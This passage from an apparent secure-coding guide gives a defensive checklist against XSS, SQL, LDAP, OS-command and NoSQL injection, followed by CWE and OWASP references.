- [ ] Encode output for the appropriate context (HTML, JavaScript, URL, CSS)
- [ ] Use `textContent` instead of `innerHTML` in client-side JavaScript
- [ ] Sanitize HTML with DOMPurify when rich text is required
- [ ] Deploy Content Security Policy headers
- [ ] Use `execFile` or `spawn` instead of `exec` for system commands
- [ ] Escape LDAP special characters in LDAP queries
- [ ] Never use `eval()`, `new Function()`, or `$where` with user input
- [ ] Set `HttpOnly` and `Secure` flags on session cookies
- [ ] Implement WAF rules as defense-in-depth (not primary defense)
- [ ] Run automated scanners (SQLMap, ZAP) in CI/CD pipelines

## References

- CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
- CWE-90: Improper Neutralization of Special Elements used in an LDAP Query
- CWE-78: Improper Neutralization of Special Elements used in an OS Command
- CWE-943: Improper Neutralization of Special Elements in Data Query Logic (NoSQL)
- OWASP XSS Prevention Cheat Sheet
- OWASP SQL Injection Prevention Cheat Sheet
- OWASP DOM-Based XSS Prevention Cheat Sheet
